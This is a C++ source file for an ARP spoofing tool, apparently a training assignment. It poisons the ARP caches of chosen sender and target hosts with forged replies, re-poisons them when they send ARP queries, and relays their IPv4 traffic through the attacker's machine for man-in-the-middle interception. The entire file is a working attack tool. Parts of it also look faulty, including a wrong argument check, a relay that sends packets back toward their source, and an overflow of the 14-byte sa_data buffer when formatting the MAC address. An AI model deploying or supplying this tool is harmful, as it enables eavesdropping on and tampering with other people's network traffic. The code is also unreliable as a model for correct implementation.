#include <cstdio>
#include <iostream>
#include <thread>
#include <pcap.h>
#include <vector>
#include <map>

#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <net/if.h>
#include <arpa/inet.h>

#include "ethhdr.h"
#include "arphdr.h"

#define A_SIZE 10
using namespace std;

// https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
// https://www.includehelp.com/cpp-programs/get-mac-address-of-linux-based-network-device.aspx

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

map<Ip, Mac> arp_table;

struct Flow
{
	Ip sender_ip;
	Mac sender_mac;
	Ip target_ip;
	Mac target_mac;
};

Ip attacker_ip;
Mac attacker_mac;
Flow flow[A_SIZE];

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int send_arp(pcap_t* handle, Mac ether_dMac, Mac ether_sMac, uint16_t opcode, Mac arp_sMac, Ip sIp, Mac arp_dMac, Ip dIp)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = ether_dMac;
	packet.eth_.smac_ = ether_sMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	// packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.op_ = htons(opcode);
	packet.arp_.smac_ = arp_sMac;
	packet.arp_.sip_ = htonl(sIp);
	packet.arp_.tmac_ = arp_dMac;
	packet.arp_.tip_ = htonl(dIp);

	return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

Ip get_my_ip(char* dev)
{
	int fd;
	struct ifreq ifr;
	char ip[16];

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short), ip, sizeof(struct sockaddr));

	return Ip(ip);
}
Mac get_my_mac(char* dev)
{
	int fd;
	char* mac;

	struct ifreq ifr;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name , dev , IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);

	mac = (char *)ifr.ifr_hwaddr.sa_data;
	sprintf(mac, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", mac[0]&0xff, mac[1]&0xff, mac[2]&0xff, mac[3]&0xff, mac[4]&0xff, mac[5]&0xff);

	return Mac(mac);
}
Mac get_sender_mac(pcap_t* handle, Ip sender_ip, Ip my_ip, Mac my_mac){

	int res = send_arp(handle, Mac("ff:ff:ff:ff:ff:ff"), my_mac, ArpHdr::Request,
					   my_mac, my_ip, Mac("00:00:00:00:00:00"), sender_ip);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	EthArpPacket *etharp;

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		if (packet == NULL) continue;
        
		etharp = (EthArpPacket *) packet;
		if(etharp->eth_.type() != EthHdr::Arp) continue;

		if(etharp->arp_.hrd() != ArpHdr::ETHER || etharp->arp_.pro() != EthHdr::Ip4 || etharp->arp_.op() != ArpHdr::Reply) {
			continue;
		}

		if(Mac(my_mac) == etharp->arp_.tmac() && Ip(my_ip) == etharp->arp_.tip() && Ip(sender_ip) == etharp->arp_.sip()) {
			break;
		}
	}

	Mac sender_mac = etharp->arp_.smac();

	return sender_mac;
}

int arp_infect(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip my_ip, Mac my_mac, Ip target_ip){

	int res = send_arp(handle, sender_mac, my_mac, ArpHdr::Reply, Mac(my_mac), 
						target_ip, sender_mac, sender_ip);
		
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	return res;
}

void relay(pcap_t* handle, const u_char* packet, int len, Ip srcIp){
	u_char* send = (u_char*)malloc(sizeof(u_char) * len);

	EthHdr *eth = (EthHdr*) packet;
	eth->smac_ = attacker_mac;
	eth->dmac_ = arp_table.at(srcIp);
	memcpy(send, packet, len);
	memcpy(send, eth, ETH_HLEN);
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(send), len);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    free(send);
	return;
}

// A -> B , B -> A 가 있다고 가정
int main(int argc, char* argv[]) {
	if (argc < 4 && argc % 2 != 0) {
		usage();
		return -1;
	}

	int num_of_flow = (argc -2) / 2;

	char* dev = argv[1];
	for(int i = 2 ; i < argc; i+=2){
		flow[(i-2) / 2].sender_ip = Ip(argv[i]);
		flow[(i-2) / 2].target_ip = Ip(argv[i+1]);
	}
	
	//print info
	for(int i = 0 ; i < num_of_flow; i++){
		cout << i+1 << " : "<< std::string(flow[i].sender_ip) << " -> " << std::string(flow[i].target_ip) << endl;
	}
	cout << endl;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	//get attacker's info
	attacker_ip = get_my_ip(dev);
	attacker_mac = get_my_mac(dev);

	cout << "#attacker's info" << endl;
	cout << "attacker's ip : " << std::string(attacker_ip) << endl;
	cout << "attacker's mac : " << std::string(attacker_mac) << endl << endl;
	
	//get sender's info
	for(int i = 0 ; i < num_of_flow; i++)
	{
		if(arp_table.find(flow[i].sender_ip) != arp_table.end())
			continue;

		flow[i].sender_mac = get_sender_mac(handle, flow[i].sender_ip, attacker_ip, attacker_mac);
		arp_table.insert(pair<Ip, Mac>(flow[i].sender_ip, flow[i].sender_mac));
	}
	for(int i = 0 ; i < num_of_flow; i++)
	{
		if(arp_table.find(flow[i].target_ip) != arp_table.end())
			flow[i].target_mac = arp_table.at(flow[i].target_ip);
	}

	//print arp_table
	cout << "#arp_table info" << endl;
	for(auto iter = arp_table.begin(); iter != arp_table.end(); iter++)
	{
		cout << std::string(iter->first) << " : " << std::string(iter->second) << endl;
	}

	//arp_infect
	for(int i = 0 ; i < num_of_flow; i++)
	{
		arp_infect(handle, flow[i].sender_ip, flow[i].sender_mac, attacker_ip, attacker_mac, flow[i].target_ip);
	}

	
	//packet capture
	EthHdr *eth;

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		if (packet == NULL) continue;
        
		eth = (EthHdr *) packet; 

		if(eth->type() == EthHdr::Ip4){
			ip * ipv4 = (ip *) (packet + ETH_HLEN);
			char buf[16];
			Ip srcIp;
			
			sprintf(buf,"%s",inet_ntoa(ipv4->ip_src));
			srcIp = Ip(buf);

			if(arp_table.find(srcIp) != arp_table.end())
				relay(handle, packet, header->len, srcIp);
		}
			
		if(eth->type() == EthHdr::Arp){
			EthArpPacket * etharp = (EthArpPacket *) packet;

			//브로드 캐스트로 target이 arp 패킷을 보낼 때 + sender가 arp 패킷을 보낼 때 
			//유니 캐스트로 sender가 물어볼 때
			for(auto iter = arp_table.begin(); iter != arp_table.end(); iter++)
			{
				if(etharp->arp_.smac() == iter->second && (etharp->arp_.tmac() == Mac::broadcastMac() || etharp->arp_.tmac() == attacker_mac)){
					arp_infect(handle, etharp->arp_.sip(), etharp->arp_.smac(), attacker_ip, attacker_mac, etharp->arp_.tip());
				}
			}

		}
	}
	
	pcap_close(handle);
}
